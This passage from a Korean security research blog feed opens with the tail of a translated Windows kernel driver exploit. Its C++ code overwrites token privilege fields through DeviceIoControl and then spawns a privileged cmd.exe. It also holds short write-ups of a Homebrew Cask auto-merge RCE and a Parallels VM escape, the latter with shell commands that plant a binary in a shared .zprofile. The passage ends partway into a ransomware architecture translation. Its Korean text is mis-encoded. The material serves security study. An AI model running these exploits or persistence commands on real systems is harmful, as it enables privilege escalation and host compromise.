class="hljs-keyword">if</span> (!success)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t open handle to the current process token. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Opened a handle to the current process token!\n&quot;</span>;    <span class="hljs-comment">// allocate space in the heap for the handle table information which will be filled by the call to &#x27;NtQuerySystemInformation&#x27; API</span>    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(::GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);    <span class="hljs-comment">// call NtQuerySystemInformation and fill the handleTableInformation structure</span>    ULONG returnLength = <span class="hljs-number">0</span>;    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &amp;returnLength);    <span class="hljs-keyword">uint64_t</span> tokenAddress = <span class="hljs-number">0</span>;    <span class="hljs-comment">// iterate over the system&#x27;s handle table and look for the handles beloging to our process</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; handleTableInformation-&gt;NumberOfHandles; i++)    &#123;        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation-&gt;Handles[i];        <span class="hljs-comment">// if it finds our process and the handle matches the current token handle we already opened, print it</span>        <span class="hljs-keyword">if</span> (handleInfo.UniqueProcessId == ::GetCurrentProcessId() &amp;&amp; handleInfo.HandleValue == (USHORT)currentToken)        &#123;            tokenAddress = (<span class="hljs-keyword">uint64_t</span>)handleInfo.Object;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Current token address in kernelspace is: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; tokenAddress &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        &#125;    &#125;    <span class="hljs-comment">// allocate a variable set to 0</span>    <span class="hljs-keyword">int</span> field2 = <span class="hljs-number">0</span>;    <span class="hljs-comment">/*</span><span class="hljs-comment">    dt nt!_SEP_TOKEN_PRIVILEGES</span><span class="hljs-comment">       +0x000 Present          : Uint8B</span><span class="hljs-comment">       +0x008 Enabled          : Uint8B</span><span class="hljs-comment">       +0x010 EnabledByDefault : Uint8B</span><span class="hljs-comment"></span><span class="hljs-comment">    We&#x27;ve added +1 to the offsets to ensure that the low bytes part are 0xff.</span><span class="hljs-comment">    */</span>    <span class="hljs-comment">// overwrite the _SEP_TOKEN_PRIVILEGES  &quot;Present&quot; field in the current process token</span>    Exploit exploit =        &#123;            <span class="hljs-number">8</span>,            <span class="hljs-number">0</span>,            &amp;field2,            (<span class="hljs-keyword">void</span> *)(tokenAddress + <span class="hljs-number">0x41</span>)&#125;;    <span class="hljs-comment">// overwrite the _SEP_TOKEN_PRIVILEGES  &quot;Enabled&quot; field in the current process token</span>    Exploit exploit2 =        &#123;            <span class="hljs-number">8</span>,            <span class="hljs-number">0</span>,            &amp;field2,            (<span class="hljs-keyword">void</span> *)(tokenAddress + <span class="hljs-number">0x49</span>)&#125;;    <span class="hljs-comment">// overwrite the _SEP_TOKEN_PRIVILEGES  &quot;EnabledByDefault&quot; field in the current process token</span>    Exploit exploit3 =        &#123;            <span class="hljs-number">8</span>,            <span class="hljs-number">0</span>,            &amp;field2,            (<span class="hljs-keyword">void</span> *)(tokenAddress + <span class="hljs-number">0x51</span>)&#125;;    DWORD bytesReturned = <span class="hljs-number">0</span>;    success = DeviceIoControl(        device,        IOCTL_CODE,        &amp;exploit,        <span class="hljs-keyword">sizeof</span>(exploit),        <span class="hljs-literal">nullptr</span>,        <span class="hljs-number">0</span>,        &amp;bytesReturned,        <span class="hljs-literal">nullptr</span>);    <span class="hljs-keyword">if</span> (!success)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t overwrite current token &#x27;Present&#x27; field. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Successfully overwritten current token &#x27;Present&#x27; field!\n&quot;</span>;    success = DeviceIoControl(        device,        IOCTL_CODE,        &amp;exploit2,        <span class="hljs-keyword">sizeof</span>(exploit2),        <span class="hljs-literal">nullptr</span>,        <span class="hljs-number">0</span>,        &amp;bytesReturned,        <span class="hljs-literal">nullptr</span>);    <span class="hljs-keyword">if</span> (!success)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t overwrite current token &#x27;Enabled&#x27; field. Error code: &quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Successfully overwritten current token &#x27;Enabled&#x27; field!\n&quot;</span>;    success = DeviceIoControl(        device,        IOCTL_CODE,        &amp;exploit3,        <span class="hljs-keyword">sizeof</span>(exploit3),        <span class="hljs-literal">nullptr</span>,        <span class="hljs-number">0</span>,        &amp;bytesReturned,        <span class="hljs-literal">nullptr</span>);    <span class="hljs-keyword">if</span> (!success)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Couldn&#x27;t overwrite current token &#x27;EnabledByDefault&#x27; field. Error code:&quot;</span> &lt;&lt; ::GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Successfully overwritten current token &#x27;EnabledByDefault&#x27; field!\n&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Token privileges successfully overwritten!\n&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] Spawning a new shell with full privileges!\n&quot;</span>;    system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">    |\__/,|   (`\</span><span class="hljs-comment">  _.|o o  |_   ) )</span><span class="hljs-comment">-(((---(((--------</span><span class="hljs-comment">*/</span></code></pre><h1 id="Video-PoC"><a href="#Video-PoC" class="headerlink" title="Video PoC"></a>Video PoC</h1><p><a href="https://www.youtube.com/watch?v=IIARwtJEhxs&feature=emb_title">https://www.youtube.com/watch?v=IIARwtJEhxs&amp;feature=emb_title</a></p><h1 id="Upcoming-Article"><a href="#Upcoming-Article" class="headerlink" title="Upcoming Article"></a>Upcoming Article</h1><p>ì¼ë¶€ ê³µê¸‰ ì—…ì²´ì˜ ì œì•½ìœ¼ë¡œ ì¸í•´ ì•½ê°„ ì—°ê¸°í•´ì•¼ í–ˆìœ¼ë©° ë‹¤ìŒ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼ì—ì„œëŠ” ì¸ê¸°ìˆëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì„ì˜ íŒŒì¼ ì“°ê¸°ì—ì„œ ê¶Œí•œ ìƒìŠ¹ (EoP)ìœ¼ë¡œ ë„˜ì–´ê°€ë„ë¡ í•œ ì¼ë ¨ì˜ ë²„ê·¸ë¥¼ ê³µê°œ í•  ì˜ˆì •ì´ë‹¤.</p><h1 id="Resources-amp-References"><a href="#Resources-amp-References" class="headerlink" title="Resources &amp; References"></a>Resources &amp; References</h1><ul><li><a href="https://www.youtube.com/watch?v=qk-OI8Z-1To">Driver Attack Surface</a></li><li><a href="https://github.com/Microsoft/Windows-Driver-Frameworks">Windows DriverFrameworks</a></li><li><a href="https://www.exploit-db.com/exploits/42556">Abusing Token Privileges for LPE</a></li><li><a href="https://twitter.com/HackSysTeam">@HackSysTeam</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>ioctl</tag>
      
      <tag>L0ch</tag>
      
      <tag>driver</tag>
      
      <tag>exploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Homebrew package managerì˜ RCE ì·¨ì•½ì </title>
    <link href="/2021/04/27/l0ch/2021-04-27/"/>
    <url>/2021/04/27/l0ch/2021-04-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1167608">Broken parsing of Git diff allows an attacker to inject arbitrary Ruby scripts to Casks on official taps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Homebrew</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MacOs, Linuxì—ì„œ ì‚¬ìš©ë˜ëŠ” ì˜¤í”ˆì†ŒìŠ¤ ì»¤ë§¨ë“œ ë¼ì¸ íŒ¨í‚¤ì§€ ë§¤ë‹ˆì €ì¸ Homebrewì˜ Homebrew Caskì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Homebrew CaskëŠ” ì»¤ë§¨ë“œ ë¼ì¸ì—ì„œ GUI ê¸°ë°˜ ì–´í”Œë¦¬ì¼€ì´ì…˜ íŒ¨í‚¤ì§€ë¥¼ ê´€ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ì·¨ì•½ì ì€ Homebrew-caskì˜ github ì €ì¥ì†Œ ê´€ë¦¬ì— ì¡´ì¬í•©ë‹ˆë‹¤. Homebrew-caskì—ëŠ” <code>Review-cask-pr</code> github actionì´ ì¡´ì¬í•˜ë©° í•´ë‹¹ actionì€ <code>git_diff</code> ë¥¼ ì‚¬ìš©í•´ pull requestëœ ì½”ë“œì˜ ë³€ê²½ì ì„ íŒŒì‹±í•˜ê³  ë³€ê²½ì ì´ í¬ì§€ ì•Šê³  ê°„ë‹¨í•œ ê²½ìš° ì´ë¥¼ ìë™ìœ¼ë¡œ mergeí•©ë‹ˆë‹¤. ì´ë•Œ <code>git_diff</code> ëŠ” ë‹¤ìŒê³¼ ê°™ì´ íŒŒì¼ì„ íŒŒì‹±í•©ë‹ˆë‹¤.</p><ol><li>ê° í–‰ì— ëŒ€í•´ <code>^diff --git(?: a/(\S+))?(?: b/(\S+))?</code> ì •ê·œì‹ê³¼ ì¼ì¹˜í•˜ëŠ” ê²½ìš° í˜„ì¬ ì²˜ë¦¬ì¤‘ì¸ íŒŒì¼ ì •ë³´ë¥¼ ì •ê·œì‹ê³¼ ì¼ì¹˜í•˜ëŠ” ì½”ë“œë¡œ ë³€ê²½í•©ë‹ˆë‹¤.</li><li>1ë‹¨ê³„ê°€ ì¼ì¹˜í•˜ì§€ ì•ŠëŠ” ê²½ìš° <code>git_diff/file.rb</code>ì˜ <code>extract_diff_meta_data</code> í•¨ìˆ˜ì˜ ì •ê·œì‹ ì¤‘ í•˜ë‚˜ì™€ ì¼ì¹˜í•˜ëŠ”ì§€ í™•ì¸í•˜ê³  íŒŒì¼ ê²½ë¡œë¥¼ ë³€ê²½í•©ë‹ˆë‹¤. </li><li>2ë‹¨ê³„ê°€ ì¼ì¹˜í•˜ì§€ ì•ŠëŠ” ê²½ìš° íŒŒì¼ ë‚´ìš©ì— ëŒ€í•œ ë³€ê²½ìœ¼ë¡œ ì²˜ë¦¬í•´ <code>+</code>, <code>-</code>ì— ë”°ë¼ ì½”ë“œ ì¶”ê°€ ë˜ëŠ” ì‚­ì œë¡œ ì²˜ë¦¬í•©ë‹ˆë‹¤.</li></ol><p>ë§Œì•½ ë³€ê²½ëœ íŒŒì¼ ë‚´ìš©ì´ <code>++ &quot;?b/(.*)</code> í˜•ì‹ìœ¼ë¡œ ì‹œì‘í•˜ë©´ <code>extract_diff_meta_data</code> í•¨ìˆ˜ì˜ ì •ê·œì‹ ì¤‘ ì•„ë˜ ì •ê·œì‹ì— ë§¤ì¹­ë˜ì–´ íŒŒì¼ ë‚´ìš©ì— ëŒ€í•œ ë³€ê²½ì´ ì•„ë‹Œ íŒŒì¼ ê²½ë¡œ ì •ë³´ë¡œ ì²˜ë¦¬ë©ë‹ˆë‹¤. ë”°ë¼ì„œ íŒŒì¼ ë‚´ìš© ë³€ê²½ì ì´ ì—†ëŠ” pull requestë¡œ ìë™ìœ¼ë¡œ mergeë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_diff_meta_data</span><span class="hljs-params">(string)</span></span>...<span class="hljs-keyword">elsif</span> b_path_info = <span class="hljs-regexp">%r&#123;^[+]&#123;3&#125;</span> <span class="hljs-string">&quot;?b/(.*)$&#125;.match(string)</span><span class="hljs-string">@b_path = b_path_info[1]</span><span class="hljs-string">...</span></code></pre><p>ìœ„ ì·¨ì•½ì ì€ ë‹¤ìŒê³¼ ê°™ì´ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li><p>Homebrew/Casksì— í¬í•¨ëœ ë£¨ë¹„íŒŒì¼ì— ì„ì˜ ì½”ë“œë¥¼ í¬í•¨í•œ ì•„ë˜ ì½”ë“œë¥¼ ì¶”ê°€í•©ë‹ˆë‹¤.</p> <pre><code class="hljs c">++ <span class="hljs-string">&quot;b/#&#123;arbitrary code&#125;&quot;</span>++ b/Casks/iterm2.r</code></pre></li><li><p>pull requestë¥¼ ë³´ë‚´ë©´ <code>git_diff</code>ê°€ íŒŒì¼ ê²½ë¡œì •ë³´ë¡œ ì²˜ë¦¬í•´ ì¶”ê°€ëœ ì½”ë“œê°€ ë¬´ì‹œë˜ê³  <code>Review-cask-pr</code> actionì—ì„œëŠ” ë³€ê²½ì ì´ ì—†ëŠ” ì½”ë“œë¡œ ì¸ì‹í•´ ìë™ìœ¼ë¡œ ì €ì¥ì†Œì— mergeë©ë‹ˆë‹¤.</p></li><li><p>mergeëœ ë²„ì „ì˜ íŒ¨í‚¤ì§€ë¥¼ ì‚¬ìš©í•˜ëŠ” PCì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p></li></ol><p>í•´ë‹¹ ì·¨ì•½ì ì€ ìë™ìœ¼ë¡œ pull requestë¥¼ ê²€ì‚¬í•˜ê³  mergeí•˜ëŠ” <code>automerge</code> ë° <code>review-cask-pr</code> github actionì„ ì œê±°í•˜ê³  ìˆ˜ë™ìœ¼ë¡œ ê²€ì‚¬ ë° ìŠ¹ì¸í•˜ë„ë¡ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>github</tag>
      
      <tag>homebrew</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Full VM escape Parallels Desktop on Intel and M1</title>
    <link href="/2021/04/26/idioth/2021-04-26/"/>
    <url>/2021/04/26/idioth/2021-04-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://zerodayengineering.com/blog/dont-share-your-home.html">Donâ€™t Share Your $HOME with Untrusted Guests</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>4ì›” 23ì¼ ê¸°ì¤€ Parallels Desktop ìµœì‹  ë²„ì „(Parallels Desktop 16.5.0 both Intel and M1)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ë§¤í‚¨í† ì‹œ ì»´í“¨í„°ì— í•˜ë“œì›¨ì–´ ê°€ìƒí™”ë¥¼ ì œê³µí•˜ëŠ” Parallels Desktopì—ì„œ Guest OSì™€ <code>$HOME</code> ë””ë ‰í„°ë¦¬ë¥¼ ê³µìœ í•˜ì—¬ ë°œìƒí•˜ëŠ” VM Escapeê°€ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ParallelsëŠ” ê¸°ë³¸ ê°’ìœ¼ë¡œ í˜¸ìŠ¤íŠ¸ ìš´ì˜ì²´ì œ(MacOS)ì˜ ì‚¬ìš©ì í™ˆ ë””ë ‰í„°ë¦¬ë¥¼ Parallels ê³µìœ  í´ë”ë¡œ ê²ŒìŠ¤íŠ¸ OSì— ê³µìœ í•©ë‹ˆë‹¤. MacOSì—ì„œ interactive shell binaryëŠ” ë‹¤ë¥¸ ìœ ë‹‰ìŠ¤ ê¸°ë°˜ OSì™€ ë™ì¼í•˜ê²Œ í„°ë¯¸ë„ì´ ì—´ë¦´ ë•Œë§ˆë‹¤ ì‹¤í–‰ë˜ë©° bash profileì„ ì°¸ì¡°í•©ë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ì—¬ ê³µìœ  í™ˆ ë””ë ‰í„°ë¦¬ì— ì•…ì„± ë°”ì´ë„ˆë¦¬ë¥¼ ì‚½ì…í•œ í›„ <code>.zprofile</code>ì´ë‚˜ ë‹¤ë¥¸ shell profile fileì—ì„œ í˜¸ì¶œí•˜ë©´ ë°”ì´ë„ˆë¦¬ëŠ” í„°ë¯¸ë„ì´ ì‹œì‘ë  ë•Œë§ˆë‹¤ í˜¸ìŠ¤íŠ¸ OSì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì§€ì†ì ìœ¼ë¡œ í˜¸ìŠ¤íŠ¸ OSì— RCEê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>POCëŠ” ë‹¤ìŒê³¼ ê°™ìœ¼ë©° ì•…ì„± ë°”ì´ë„ˆë¦¬ ìƒ˜í”Œì€ <a href="https://github.com/badd1e/Proof-of-Concept/tree/main/prl_not0day">github</a>ì—ì„œ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs awk">cp mybinary <span class="hljs-regexp">/media/</span>psf<span class="hljs-regexp">/Home/</span>.hellochmod +x <span class="hljs-regexp">/media/</span>psf<span class="hljs-regexp">/Home/</span>.helloecho <span class="hljs-string">&quot;~/.hello&quot;</span> &gt;&gt; <span class="hljs-regexp">/media/</span>psf<span class="hljs-regexp">/Home/</span>.zprofile</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mac</tag>
      
      <tag>idioth</tag>
      
      <tag>parallels</tag>
      
      <tag>vm escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Architecture of Ransomware Part 2</title>
    <link href="/2021/04/25/idioth/arch_of_ransomware_part2/"/>
    <url>/2021/04/25/idioth/arch_of_ransomware_part2/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš”! idiothì…ë‹ˆë‹¤. ê¸¸ê³  ê¸¸ì—ˆë˜ ì¤‘ê°„ê³ ì‚¬ ê¸°ê°„ì´ì—ˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì œ ì¤‘ê°„ê³ ì‚¬ ê¸°ê°„ì€ ë” ê¸¸ì–´ì„œ ì•„ì§ ëë‚˜ì§€ ì•Šì•˜ë„¤ìš”. ì‹œí—˜ í•˜ë‚˜ì™€ ëŒ€ì²´ ê³¼ì œ 3ê°œê°€ ë‚¨ì•„ìˆëŠ” ì‚¶ì…ë‹ˆë‹¤. ê²Œë‹¤ê°€ ê³¼ëª© í•˜ë‚˜ëŠ” ì–‘ì´ ë„ˆë¬´ ë§ì•„ì„œ ì„ íƒê³¼ ì§‘ì¤‘ì„ í–ˆëŠ”ë° ì œê°€ ì„ íƒí•œ ë¶€ë¶„ì—ì„œ 12 ë¬¸ì œ ì¤‘ í•œ ë¬¸ì œ ë‚˜ì™”ë„¤ìš”. 10ì  ë°‘ìœ¼ë¡œ ë°›ì„ ê²ƒ ê°™ìŠµë‹ˆë‹¤. í•˜í•˜í•˜í•˜í•˜í•˜í•˜í•˜í•˜í•˜</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled.png"></p><p>ì´ë¯¸ ì§€ë‚˜ê°„ ì¼ í›„íšŒí•˜ì§€ ì•Šê² ìŠµë‹ˆë‹¤â€¦ ê¸°ë§ ë•Œ ë” ì˜í•˜ë©´ ë˜ë‹ˆê¹Œìš”^^. ì¡ë‹´ì´ ê¸¸ì—ˆìŠµë‹ˆë‹¤. ì˜¤ëŠ˜ì€ ì €ë²ˆ ê²Œì‹œê¸€ì— ì´ì–´ì„œ íŒŒíŠ¸ 2ë¥¼ ì§„í–‰í•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤!</p><p>ì´ì „ ê²Œì‹œê¸€ ë³´ëŸ¬ê°€ê¸°: <a href="https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/">[Translation] Architecture of Ransomware Part 1</a></p><hr><blockquote><p>ì›ë¬¸ ê¸€ : <a href="https://infosecwriteups.com/architecture-of-a-ransomware-2-2-e22d8eb11cee">Architecture of a ransomware (2/2)</a></p></blockquote><p><a href="https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/">Part 1</a>ì—ì„œ ëœì„¬ì›¨ì–´ê°€ íš¨ê³¼ì ìœ¼ë¡œ ë™ì‘í•˜ëŠ”ë° í•„ìš”í•œ ì£¼ìš”í•œ ê°œë…ì— ëŒ€í•´ì„œ ì„¤ëª…í–ˆë‹¤. ì´ë²ˆ íŒŒíŠ¸ì—ì„œ íŒŒì´ì¬ ì½”ë“œë¥¼ í†µí•´ ê°œë…ë“¤ì„ ë³´ì—¬ì¤„ ê²ƒì´ë‹¤. ë˜í•œ ì•”í˜¸í™”ë¥¼ ìœ„í•œ pycryptodome íŒŒì´ì¬ ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ê¸°ë³¸ì ì¸ ì‚¬ìš©ë²•ë„ ë‹¤ë£° ê²ƒì´ë‹¤. ìŠ¤í¬ë¦½íŠ¸ í‚¤ë””ë“¤ì´ ì•…ìš©í•  ìˆ˜ ì—†ë„ë¡ ì „ì²´ ì†ŒìŠ¤ ì½”ë“œë¥¼ ì˜¬ë¦¬ì§„ ì•Šì„ ê²ƒì´ë‹¤. ì´ ê²Œì‹œê¸€ì˜ ëª©ì ì€ ì•…ì„± í–‰ìœ„ì— ì‚¬ìš©í•˜ë¼ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ ëœì„¬ì›¨ì–´ ì•…ì„±ì½”ë“œì— ëŒ€í•œ ì§€ì‹ì„ ê³µìœ í•˜ëŠ” ê²ƒì´ë‹¤.</p><h1 id="ì¼ë°˜ì ì¸-ê³ ë ¤-ì‚¬í•­"><a href="#ì¼ë°˜ì ì¸-ê³ ë ¤-ì‚¬í•­" class="headerlink" title="ì¼ë°˜ì ì¸ ê³ ë ¤ ì‚¬í•­"></a>ì¼ë°˜ì ì¸ ê³ ë ¤ ì‚¬í•­</h1><p>ì—¬ëŸ¬ ê°œì˜ ì˜¤í”ˆ ì†ŒìŠ¤ ëœì„¬ì›¨ì–´ê°€ ì¡´ì¬í•˜ë©° ëœì„¬ì›¨ì–´ ê°œë°œì— ê´€í•´ì„œ ì°¾ì•„ë³´ë‹¤ê°€ <a href="https://medium.com/u/ea2f2c25847b?source=post_page-----e22d8eb11cee--------------------------------">TarcÃ­sio Marinho</a>ê°€ ê°œë°œí•œ <a href="https://github.com/tarcisio-marinho/GonnaCry">GonnaCry</a>ë¼ëŠ” ëœì„¬ì›¨ì–´ë¥¼ ë°œê²¬í–ˆë‹¤. ì½”ë“œê°€ ë§¤ìš° ë¶„ëª…í•˜ë©° ì½ì–´ ë³´ëŠ” ê²ƒì„ ì¶”ì²œí•œë‹¤.</p><p>ê·¸ì˜ ëœì„¬ì›¨ì–´ëŠ” â€œmanagement sideâ€ë¥¼ ìœ„í•œ ëª¨ë“  ì½”ë“œê°€ í¬í•¨ë˜ì–´ ìˆë‹¤. ê·¸ëŠ” ë³µí˜¸í™” í‚¤ë¥¼ ê´€ë¦¬í•˜ê³  ê°ì—¼ëœ í´ë¼ì´ì–¸íŠ¸ì™€ í†µì‹ í•˜ëŠ” í•´ì»¤ ì¸¡ ì„œë²„ë¥¼ ì½”ë”©í–ˆë‹¤.</p><p>í•„ìëŠ” ëœì„¬ì›¨ì–´ê°€ ì–´ë–»ê²Œ ë™ì‘í•˜ëŠ”ì§€ ë°°ìš°ê¸° ìœ„í•´ ëª¨ë“  ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ê³ , ì‹¤ì œ ëœì„¬ì›¨ì–´ëŠ” ì´ ë¶€ë¶„ì„ ëª¨ë‘ ë‹¤ë¥´ê²Œ ì²˜ë¦¬í•˜ë¯€ë¡œ í•´ë‹¹ ë¶€ë¶„ì€ ë‹¤ë£¨ê³  ì‹¶ì§€ ì•Šì•˜ë‹¤. paymentë¥¼ ë“±ë¡í•˜ê³  ë³µí˜¸í™” í‚¤ë¥¼ ì „ì†¡í•˜ëŠ” ìë™í™” ì„œë¹„ìŠ¤, victimê³¼ ì§ì ‘ ìƒí˜¸ì‘ìš©í•˜ëŠ” í† ë¥´ ì´ë©”ì¼ ì£¼ì†Œ, ëª‡ ê°œì˜ ìƒ˜í”Œ íŒŒì¼ì„ í†µí•´ ë³µí˜¸í™”í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ì‹œìŠ¤í…œ ë“±ì´ ìˆì„ ìˆ˜ë„ ìˆë‹¤. ì´ ë¶€ë¶„ì€ ìº í˜ì¸ë§ˆë‹¤ ë‹¬ë¼ì„œ ë‹¤ë£¨ì§€ ì•Šì„ ê²ƒì´ë‹¤. ë‚˜ëŠ” í´ë¼ì´ì–¸íŠ¸ ê°ì—¼ ì¸¡ë©´ì— ì£¼ë¡œ í¬ì»¤ìŠ¤ë¥¼ ë§ì¶œ ê²ƒì´ë‹¤.</p><h1 id="ì–¸ì–´-ì„ íƒ"><a href="#ì–¸ì–´-ì„ íƒ" class="headerlink" title="ì–¸ì–´ ì„ íƒ"></a>ì–¸ì–´ ì„ íƒ</h1><p>í•„ìëŠ” ëª‡ ê°€ì§€ ì´ìœ ë¡œ íŒŒì´ì¬ì„ ì„ íƒí–ˆë‹¤. ì£¼ìš”í•œ ì´ìœ ëŠ” ã„¹ã…‡ ì½ê¸° ì‰½ê³  ì´í•´í•˜ê¸° ì‰¬ìš°ë‹ˆê¹Œ.</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%201.png"></p><p><code>os.system</code>ìœ¼ë¡œ í˜¸ì¶œëœ OSë³„ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šìœ¼ë©´ í¬ë¡œìŠ¤ í”Œë«í¼ ë˜í•œ ê°€ëŠ¥í•˜ë‹¤. ë˜í•œ ì†ë„ê°€ ë¹ ë¥´ê³  ì•”í˜¸í™”ë¥¼ ìœ„í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ìˆë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ ì»´íŒŒì¼ëœ ì½”ë“œ ë‚œë…í™”ê°€ ê°€ëŠ¥í•˜ì—¬ ë¦¬ë²„ì‹±í•˜ê¸° ì–´ë µê²Œ ë§Œë“¤ ìˆ˜ ìˆë‹¤.</p><p>íŒŒì´ì¬ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì„ íƒí•  ë•Œ ë™ì¼í•œ ê¸°ëŠ¥ì„ í•˜ëŠ” ê±¸ ì—¬ëŸ¬ ê°œ ì°¾ì•„ë¼. ê°ê°ì˜ ê²ƒì„ ì—°êµ¬í•˜ê³  ê°€ì¥ ë§ì´ ì‚¬ìš©ë˜ëŠ” ê²ƒì„ ì„ íƒí•˜ëŠ” ê²ƒì€ ì•”í˜¸í™”ì²˜ëŸ¼ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” ê²ƒì— ëŒ€í•´ì„œ ì¢‹ì€ ì ‘ê·¼ ë°©ì‹ì´ë‹¤. ì˜¤ë˜ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜ <a href="https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/">Lockcrypt</a>ì²˜ëŸ¼ ìì²´ ê°œë°œí•œ ì•”í˜¸í™”ë¥¼ ì‚¬ìš©(í•˜ì§€ 